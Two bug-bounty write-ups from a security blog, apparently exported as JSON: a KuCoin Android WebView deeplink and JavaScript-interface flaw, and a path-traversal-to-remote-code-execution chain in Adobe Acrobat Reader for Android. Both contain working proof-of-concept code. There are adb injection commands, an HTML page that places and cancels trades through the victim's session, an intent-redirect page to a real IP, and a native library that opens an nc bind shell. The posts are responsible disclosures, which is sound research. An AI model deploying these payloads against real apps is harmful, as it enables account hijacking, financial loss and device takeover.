[{"content":"Intro Webview in Android Ecosystem is an extension of Android\u0026rsquo;s view class that lets you display web pages as a part of your application activity layout. You can call it as a web browser built into your application but it doesn\u0026rsquo;t include the features of a fully developed web browser, such as navigation controls or an address bar. It is one of the widely used component in android application ecosystem, it is also prone to number of potential errors. If it is possible to load arbitrary url or execute arbitrary javascript in webview it could potentially lead to leaking of authentication tokens, the theft of arbitrary files and access to arbitrary activities. In this blog I will show how I exploited the exposed javascript interface by the application to perform critical authenticated actions like placing a trade order, cancelling trade order or deactivting the account.\n# Finding the vulnerability Last Year I came across a program on hackenproof called KuCoin which had interesting focus point for their mobile targets and the bounty table was really good so I thought if I am able to find a vulnerability that they are interested in I could get a nice bounty from them. I began testing on the application, I installed the application on my device, created an account in the app , decompiled the app using jadx. My first target was to open arbitrary url in the apps webview so I started looking for deeplinks in the application.\nIn AndroidManifest.xml the application has defined an exported activity called com.kubi.kucoin.feature.UriActivity which handles the incoming deeplinks to the application.\n\u0026lt;activity android:theme=\u0026#34;@style/kucoin_splash\u0026#34; android:name=\u0026#34;com.kubi.kucoin.feature.UriActivity\u0026#34; android:exported=\u0026#34;true\u0026#34; android:screenOrientation=\u0026#34;portrait\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;data android:scheme=\u0026#34;kucoin\u0026#34;/\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter android:autoVerify=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;kucoin.onelink.me\u0026#34; android:pathPrefix=\u0026#34;/iqEP\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; I opened the com.kubi.kucoin.feature.UriActivity and there I couldn\u0026rsquo;t figure out the logic of how deeplinks are being handled at first glance, the app was using router architecture for navigation inside the app. Then I searched for kucoin:// string in jadx and found the following deeplinks used in the app. I found the following deeplink kucoin:///link?url= which looked very promising. so I tried sending an uri like kucoin:///link?url=https://example.com to the app, I got a message saying you are going to leave KuCoin for {url} This site you try might be a phishing site ..., then I sent an uri like kucoin:///link?url=https://kucoin.com and the url loaded in the webview, so before moving back to static analysis , I tried another payload kucoin:///link?url=javascript://kucoin.com/%0adocument.write(1111) and it worked, I quickly made a simple poc showing arbitrary url loading in the app\u0026rsquo;s webview and sent the report.\nadb shell am start -n -d \u0026#39;kucoin:///link?url=javascript://kucoin.com/%250adocument.write\\(\\\u0026#34;\\\u0026lt;iframe%20src=https://www.example.com%20style%3Dposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bborder%3Anone%3B\\\u0026gt;\\\u0026lt;\\/iframe\\\u0026gt;\\\u0026#34;\\)\\;\\/\\/\u0026#39; At the time of sending the report the latest version available on playstore was v3.81.1 and later the team responded with this message Later I found out that the app was updated to v3.82.0 and the kucoin team has performed assessment on that version for the submitted report. It meant that I had to find a bypass or another way to open the arbitrary url in webview.\nBTW this was the fix implemented by the kucoin team in v3.82.0 In j.y.s0.j.e.java\npublic final boolean m6255f(String url) { Intrinsics.checkNotNullParameter(url, \u0026#34;url\u0026#34;); if (m6256e()) { Issues.m5912c(new WebMessage(\u0026#34;WhiteListMatcher isEmpty \u0026#34; + url, \u0026#34;WhiteListMatcher\u0026#34;, false, 4, null), null, 2, null); return false; } if (this.f36890e) { if (!URLUtil.isNetworkUrl(url)) { return false; } } else if (!URLUtil.isHttpsUrl(url)) { return false; //checks whether received url have http/https scheme or not } I again started doing static analysis of the application and was able to find another vulnerability which made the attack possible second time.\nIn In com.kubi.web.ui.WebViewActivity.java\npublic void onCreate(Bundle bundle) { //...// Intent intent3 = getIntent(); Intrinsics.checkNotNullExpressionValue(intent3, \u0026#34;intent\u0026#34;); this.f19927C = intentUtils.m10181f(intent3, \u0026#34;data\u0026#34;); // it is checking if the received uri contains data query parameter public final void b1() { String str = this.f19927C; if (str != null \u0026amp;\u0026amp; str.length() != 0) { z = false; } if (!z) { m25597c.loadData(C10208p.m25765h(this.f19927C), \u0026#34;text/html\u0026#34;, \u0026#34;UTF-8\u0026#34;); } } In WebViewActivity class I noticed this line intentUtils.m10181f(intent3, \u0026quot;data\u0026quot;); which was checking if the received uri contains data query parameter, this meant the application is also accepting the deeplink kucoin:///link?data= , but it didn\u0026rsquo;t come in the search result, that\u0026rsquo;s why it is very important to understand the logic of application you are testing if you don\u0026rsquo;t want to miss some very obvious thing.\nI constructed another uri and sent it to the app, this time app was using webview.loadData method to load the given data in the webview and there was no validation being made by the app about what type of data is being sent to the app.\nadb shell am start -d \u0026#39;kucoin:///link?data=\\\u0026lt;script\\\u0026gt;document.write\\(\\\u0026#34;\\\u0026lt;iframe%20src=https://www.example.com%20style%3Dposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bborder%3Anone%3B\\\u0026gt;\\\u0026lt;\\/iframe\\\u0026gt;\\\u0026#34;\\)\\;\\\u0026lt;/script\\\u0026gt;\u0026#39; After finding this I started looking further to find ways to increase the impact of this vulnerability, in the program page it was mentioned that they are interested in attacks involving javascript interfaces, so I started looking for the use of JS interface in the app.\nAndroid application uses webview.addJavascriptInterface method and @JavascriptInterface annotation to make the method public to be accessed from JavaScript code.\nIn com.kubi.sdk.hybrid.core.HybridWebView.java\npublic final void m12588b(IHybridJsInterface jsInterface, String name) { Intrinsics.checkNotNullParameter(jsInterface, \u0026#34;jsInterface\u0026#34;); Intrinsics.checkNotNullParameter(name, \u0026#34;name\u0026#34;); this.f16125f.add(name); addJavascriptInterface(new HybridJsInterface(this, jsInterface), name); } Then I searched for @JavascriptInterface anotation string in the app and found that prompt method was exposed to javascript code in j.y.k0.hybrid.core.HybridJsInterface class.\n@JavascriptInterface public final void prompt(String message) { // JavascriptInterface LOGIC // } In j.y.s0.d.h.b.java\npublic boolean mo29545a(InterfaceC18155c container, String event, HashMap\u0026lt;String, Object\u0026gt; params, HybridJsCallback hybridJsCallback) { Intrinsics.checkNotNullParameter(container, \u0026#34;container\u0026#34;); Intrinsics.checkNotNullParameter(event, \u0026#34;event\u0026#34;); Intrinsics.checkNotNullParameter(params, \u0026#34;params\u0026#34;); JSONObject jSONObject = new JSONObject(event); String optString = jSONObject.optString(FirebaseAnalytics.Param.METHOD); String url = jSONObject.optString(ImagesContract.URL); if (optString == null) { return true; } int hashCode = optString.hashCode(); if (hashCode != 102230) { if (hashCode == 3446944 \u0026amp;\u0026amp; optString.equals(\u0026#34;post\u0026#34;)) { BaseActivity i02 = container.i0(); Intrinsics.checkNotNull(i02); Intrinsics.checkNotNullExpressionValue(url, \u0026#34;url\u0026#34;); m6326c(i02, url, params, hybridJsCallback); return true; } return true; } else if (optString.equals(\u0026#34;get\u0026#34;)) { BaseActivity i03 = container.i0(); Intrinsics.checkNotNull(i03); Intrinsics.checkNotNullExpressionValue(url, \u0026#34;url\u0026#34;); m6327b(i03, url, params, hybridJsCallback); return true; } else { return true; } } From there I came across this method which was taking values from received json string\u0026rsquo;s key parameters method ,url and params. What the prompt javascript interface message was doing was that it would receive a json message and if the received message contains key parameter type and has it\u0026rsquo;s value proxy, then the method would call mo29545a the above method.\nWhat this method mo29545a was doing that, it was making an authenticated arbitrary post or get requests to appapi-v2.xcoinsystem.com this was the api used by app to communicate with backend server and then was sending back the response of the request to javascript code.\nFrom there to show the impact of vulnerability I crafted a poc which shows that you can read all open trade position, cancel all open position or create a new trade.\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Exploiting javascript interfaces\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; #callback-box { border: 1px solid black; padding: 10px; margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;reading open order positions\u0026lt;/p\u0026gt; \u0026lt;button id=\u0026#34;read-position\u0026#34;\u0026gt;Read order positions\u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;Cancel Open Position\u0026lt;/p\u0026gt; \u0026lt;button id=\u0026#34;Cancel-Order\u0026#34;\u0026gt;Cancel all open Orders\u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;Create xrpusdt sell Position\u0026lt;/p\u0026gt; \u0026lt;button id=\u0026#34;open-position\u0026#34;\u0026gt;Open Position\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;callback-box\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; window.callbackDispatcher = function(callbackId, data) { var callbackDiv = document.createElement(\u0026#34;div\u0026#34;); callbackDiv.innerText = \u0026#34;Callback ID: \u0026#34; + callbackId + \u0026#34;\\nData: \u0026#34; + data; document.getElementById(\u0026#34;callback-box\u0026#34;).appendChild(callbackDiv); }; document.getElementById(\u0026#34;Cancel-Order\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function() { window.KuCoin.prompt(\u0026#39;{\u0026#34;type\u0026#34;:\u0026#34;proxy\u0026#34;,\u0026#34;params\u0026#34;:{\u0026#34;method\u0026#34;:\u0026#34;post\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;v1/trade/order-cancel\u0026#34;,\u0026#34;tradeType\u0026#34;:\u0026#34;TRADE\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;limit\u0026#34;},\u0026#34;callback\u0026#34;:\u0026#34;window.callbackDispatcher\u0026#34;,\u0026#34;callbackId\u0026#34;:\u0026#34;4b7b8f87-c633-4aa4-b0dd-1f85121dacba\u0026#34;}\u0026#39;); }); document.getElementById(\u0026#34;open-position\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function() { window.KuCoin.prompt(\u0026#39;{\u0026#34;type\u0026#34;:\u0026#34;proxy\u0026#34;,\u0026#34;params\u0026#34;:{\u0026#34;method\u0026#34;:\u0026#34;post\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;v1/trade/order\u0026#34;,\u0026#34;symbol\u0026#34;:\u0026#34;XRP-USDT\u0026#34;,\u0026#34;side\u0026#34;:\u0026#34;sell\u0026#34;,\u0026#34;size\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;price\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;limit\u0026#34;,\u0026#34;tradeType\u0026#34;:\u0026#34;TRADE\u0026#34;},\u0026#34;callback\u0026#34;:\u0026#34;window.callbackDispatcher\u0026#34;,\u0026#34;callbackId\u0026#34;:\u0026#34;4b7b8f87-c633-4aa4-b0dd-1f85121dacba\u0026#34;}\u0026#39;); }); document.getElementById(\u0026#34;read-position\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function() { window.KuCoin.prompt(\u0026#39;{\u0026#34;type\u0026#34;:\u0026#34;proxy\u0026#34;,\u0026#34;params\u0026#34;:{\u0026#34;method\u0026#34;:\u0026#34;get\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;v2/kc/trade/orders?status=active\u0026#34;},\u0026#34;callback\u0026#34;:\u0026#34;window.callbackDispatcher\u0026#34;,\u0026#34;callbackId\u0026#34;:\u0026#34;4b7b8f87-c633-4aa4-b0dd-1f85121dacba\u0026#34;}\u0026#39;); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Here is the poc video , the only limitation to this attack was that the user first needs to login in to the app and use their trading password to create a trade(because of short lived token of trading app they are needed to authenticate first if they are making a trade after long time) and if someone is an active trader and was getting attacked by this vulnerability, these limitation would not come in the first place. The above attack clearly shows this is a high severity issue and will cause financial loss for their users. Now I will show you how the kucoin team and hackenproof mediation handled this report.\nFirst they set the attack vector as local - I don\u0026rsquo;t understand how trigerring a vulnerability from browser counts as local attack vector. I was able to make arbitrary authenticated request using their api and was also able to receive the response so I have full control of what kind of information I can receive as I showed in the poc. Allowing untrusted javascript code to make arbitrary authenticated requests? This clearly shows the integrity of the app was broken. I could also have prevented victim access from they account by freezing the account, so availability was also not low. I asked them to reconsider the severity but there was no response from them, so I asked for mediation from hackenproof team, and after months of asking for any update, they upgraded the vulnerability from low severity to cvss score of 4.3 which was again an unfair calculation. Even the kucoin agreed that this will cause financial loss, but they decided to rate it as medium severity of 4.3 cvss score. This is what they have responded with.\nAlthough I\u0026rsquo;ve moved on from this, the anger I felt at the time resurfaced while writing the blog. I hope anyone reading this gains some new insights. See you in the next one , byeee :)\n","permalink":"https://hulkvision.github.io/blog/javascript-interface/exploiting-javascript-interface/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eWebview in Android Ecosystem is an extension of Android\u0026rsquo;s view class that lets you display web pages as a part of your application activity layout. You can call it as a web browser built into your application but it doesn\u0026rsquo;t include the features of a fully developed web browser, such as navigation controls or an address bar. It is one of the widely used component in android application ecosystem, it is also prone to number of potential errors. If it is possible to load arbitrary url or execute arbitrary javascript in webview it could potentially lead to leaking of authentication tokens, the theft of arbitrary files and access to arbitrary activities. In this blog I will show how I exploited the exposed javascript interface by the application to perform critical authenticated actions like placing a trade order, cancelling trade order or deactivting the account.\u003c/p\u003e","title":"Exploiting JavaScript Interface for Unauthorized Access in a 'global' cryptocurrency exchange android app"},{"content":"# Summary While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.\n# Finding Path traversal vulnerability \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be application/pdf for this actiivity.\nWhen an intent with data url for example http://localhost/test.pdf is sent to adobe reader app,it downloads the file in /sdcard/Downloads/Adobe Acrobat folder with filename as LastPathSegment(i.e test.pdf) of the sent url.\nActivity com.adobe.reader.AdobeReader receives the intent and starts ARFileURLDownloadActivity activity.\npublic void handleIntent() { Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class); intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData()); intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType()); startActivity(intent2); } This activity ARFileURLDownloadActivitystarts com.adobe.reader.misc.ARFileURLDownloadService service.\npublic void onMAMCreate(Bundle bundle) { super.onMAMCreate(bundle); this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class); Bundle bundle2 = new Bundle(); //...// this.mServiceIntent.putExtras(bundle2); startService(); } In com.adobe.reader.misc.ARFileURLDownloadService.java\npublic int onMAMStartCommand(Intent intent, int i, int i2) { Bundle extras = intent.getExtras(); //..// String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null); ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string); this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask; aRURLFileDownloadAsyncTask.taskExecute(new Void[0]); return 2; } In com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java\nprivate void downloadFile() throws IOException, SVFileDownloadException { Exception exc; boolean z; Throwable th; boolean z2; Uri fileURI = this.mDownloadModel.getFileURI(); URL url = new URL(fileURI.toString()); try { String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() { ARFileFromURLDownloader.DownloadUrlListener public void onProgressUpdate(int i, int i2) { ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2); } @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener public boolean shouldCancelDownload() { return ARURLFileDownloadAsyncTask.this.isCancelled(); } }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url); //...// This method BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData takes this.mUri.getLastPathSegment() as argument and which returns the decoded last segment in the path of the url.\nFor example let take this url https://localhost/x/..%2F..%2Ffile.pdf so when this url is passed to getLastPathSegment() method it will take ..%2F..%2Ffile.pdf as last segment of the url and will return ../../file.pdf as output.\nThere was not any sanitization performed in downloadFile variable before passing it into File instance which resulted into path traversal vulnerability.\n# Getting RCE Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.\nA simple way to know whether an app is using play core library for dynamic code loading is to check for spiltcompat directory in /data/data/:application_id/files/ directory.\nUsing path traversal bug i can write an arbitrary apk in /data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/ directory of the app.The classes from the attackerâ€™s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this article\nAdobe reader app also downloads an module name FASOpenCVDF.apk during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path traversal vulnerability i could not write over existing files\u0026hellip; only create new files.\nI was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from /data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/ directory.\nFASOpenCVDF.apk module was also loading an native library from /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory. I decided to take a look into FASOpenCVDF.apk source code and there i founded this module is also trying to load three unavailable libraries libADCComponent.so,libColoradoMobile.so and libopencv_info.so and this solved my issue of executing code remotely.\nI created a simple poc native library , renamed it to libopencv_info.so and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.\n# Proof of Concept \u0026lt;html\u0026gt; \u0026lt;title\u0026gt; RCE in Adobe Acrobat Reader for android \u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.location.href=\u0026#34;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #include \u0026lt;jni.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) { if (fork() == 0) { system(\u0026#34;toybox nc -p 6666 -L /system/bin/sh -l\u0026#34;); } JNIEnv* env; if (vm-\u0026gt;GetEnv(reinterpret_cast\u0026lt;void**\u0026gt;(\u0026amp;env), JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } return JNI_VERSION_1_6; } # Vulnerability Fix ! In com.adobe.libs.buildingblocks.utils.BBIntentUtils.java\nprivate static final String FILE_NAME_RESERVED_CHARACTER = \u0026#34;[*/\\\\|?\u0026lt;\u0026gt;\\\u0026#34;]\u0026#34;; public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) { if (TextUtils.isEmpty(str)) { str = BBConstants.DOWNLOAD_FILE_NAME; } String str3 = null; if (!(contentResolver == null || uri == null)) { str3 = MAMContentResolverManagement.getType(contentResolver, uri); } String str4 = !TextUtils.isEmpty(str3) ? str3 : str2; if (!TextUtils.isEmpty(str4)) { String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4); if (!TextUtils.isEmpty(fileExtensionFromMimeType)) { if (str.lastIndexOf(46) == -1) { str = str + \u0026#39;.\u0026#39; + fileExtensionFromMimeType; } else { String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str); if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) \u0026amp;\u0026amp; !TextUtils.equals(mimeTypeForFile, str2))) { str = str + \u0026#39;.\u0026#39; + fileExtensionFromMimeType; } } } } return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, \u0026#34;_\u0026#34;); } Have a nice day! and if you got any doubt you can contact me on Twitter.\nTimeline Jul 29th,2021 - Reported the vulnerability to adobe Aug 4th ,2021 - report traiged Oct 13th,2021 - Vulnerability Fixed Dec 4th ,2021 - $10000 bounty awarded from GPSRP ","permalink":"https://hulkvision.github.io/blog/post1/","summary":"\u003ch2 id=\"-summary\"\u003e# Summary\u003c/h2\u003e\n\u003cp\u003eWhile testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability.\nAbode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.\u003c/p\u003e\n\u003ch2 id=\"-finding-path-traversal-vulnerability\"\u003e# Finding Path traversal vulnerability\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e        \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt;\n            \u0026lt;intent-filter\u0026gt;\n                \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt;\n                \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt;\n                \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt;\n                \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt;\n                \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt;\n            \u0026lt;/intent-filter\u0026gt;\n\u003c/code\u003e\u003c/pr","title":"RCE in Adobe Acrobat Reader for android(CVE-2021-40724)"}]